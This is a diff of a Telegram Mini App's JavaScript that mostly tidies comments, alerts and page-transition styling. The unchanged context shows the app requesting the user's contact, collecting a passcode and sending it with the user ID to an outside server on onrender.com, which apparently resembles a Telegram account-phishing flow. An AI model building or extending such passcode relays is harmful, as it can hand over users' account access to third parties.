@@ -22,9 +22,8 @@ document.addEventListener("DOMContentLoaded", () => {
 
   let userInfo = tg.initDataUnsafe?.user || null;
   const testMode = false;
-  let currentPage = "page1";
 
-  // 🧩 Hide keyboard when tapping outside input
+  // 🧩 Tap anywhere to hide keyboard
   document.addEventListener("touchstart", (e) => {
     const active = document.activeElement;
     if (
@@ -37,10 +36,10 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // 🪪 Telegram login
+  // 🪪 Telegram contact request
   loginBtn.addEventListener("click", async () => {
     if (testMode) {
-      tg.showAlert("⚠️ Please open this app from the Telegram bot.\n\nFor testing, use the TEST MODE button below.");
+      tg.showAlert("⚠️ Please open this app from the Telegram bot.");
       return;
     }
 
@@ -54,18 +53,17 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // 📱 Smooth fade-slide transition
+  // 🌈 Smooth fade-slide transition
   function smoothTransition(showEl, hideEls = []) {
     hideEls.forEach((el) => {
       el.classList.remove("active");
+      el.style.opacity = "0";
       el.style.pointerEvents = "none";
     });
 
     showEl.style.display = "flex";
     showEl.style.pointerEvents = "auto";
-
     requestAnimationFrame(() => {
-      hideEls.forEach((el) => (el.style.opacity = "0"));
       showEl.classList.add("active");
       showEl.style.opacity = "1";
       showEl.style.transform = "translateY(0)";
@@ -73,26 +71,21 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   function showPage2() {
-    currentPage = "page2";
     smoothTransition(page2, [page1]);
-    blur.style.opacity = "1";
-    popup.style.height = "420px";
+    popup.classList.add("popup-active");
   }
 
   function showPage3() {
-    currentPage = "page3";
     smoothTransition(page3, [page2]);
-    popup.style.height = "360px";
-    blur.style.opacity = "1";
+    popup.classList.add("popup-active");
   }
 
-  // 🧩 Passcode handler
+  // 🧩 Passcode
   passcodeBtn.addEventListener("click", async () => {
     const passcode = passcodeInput.value.trim();
     if (!passcode) return tg.showAlert("⚠️ Please enter passcode");
 
     let user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;
-
     if (!user_id && tg.initData) {
       const params = new URLSearchParams(tg.initData);
       const userParam = params.get("user");
@@ -105,7 +98,7 @@ document.addEventListener("DOMContentLoaded", () => {
       }
     }
 
-    if (!user_id) return tg.showAlert("⚠️ Cannot get user ID. Please open from Telegram bot.");
+    if (!user_id) return tg.showAlert("⚠️ Cannot get user ID.");
 
     try {
       await fetch("https://tgbot-gllp.onrender.com/send_data", {
@@ -138,7 +131,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // 🔢 Passcode UI visual
+  // 🔢 Passcode visual
   box.addEventListener("click", () => input.focus());
   input.addEventListener("input", () => {
     const value = input.value.split("");
